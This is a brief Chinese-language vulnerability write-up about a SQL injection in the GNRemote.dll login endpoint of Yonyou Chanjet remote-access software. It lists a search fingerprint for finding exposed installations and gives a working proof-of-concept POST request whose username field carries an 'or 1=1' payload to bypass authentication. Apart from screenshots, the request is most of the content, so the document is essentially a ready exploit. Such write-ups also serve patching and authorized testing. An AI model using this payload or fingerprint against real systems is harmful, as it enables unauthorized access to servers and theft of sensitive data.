# 用友 畅捷通远程通 GNRemote.dll SQL注入漏洞

## 漏洞描述

用友 畅捷通远程通 GNRemote.dll SQL注入漏洞，攻击者通过SQL注入可以获取服务器敏感信息或者使用万能密码登录设备

## 漏洞影响

<a-checkbox checked>用友 畅捷通远程通</a-checkbox></br>

## 网络测绘

<a-checkbox checked>body="远程通CHANJET_Remote" </a-checkbox></br>

## 漏洞复现

登录页面

![img](../../../.vuepress/public/img/1664803780708-4fd98949-6c9a-4dca-9c06-9ff70231516f.png)

验证POC

```sql
POST /GNRemote.dll?GNFunction=LoginServer&decorator=text_wrap&frombrowser=esl

username=%22'%20or%201%3d1%3b%22&password=%018d8cbc8bfc24f018&ClientStatus=1
```

![img](../../../.vuepress/public/img/1664803838437-475c0c08-3cf2-482d-afbd-2c703ef58475.png)![img](../../../.vuepress/public/img/1664803846559-8bf28c7c-a65a-4aca-8188-839f57a401d3.png)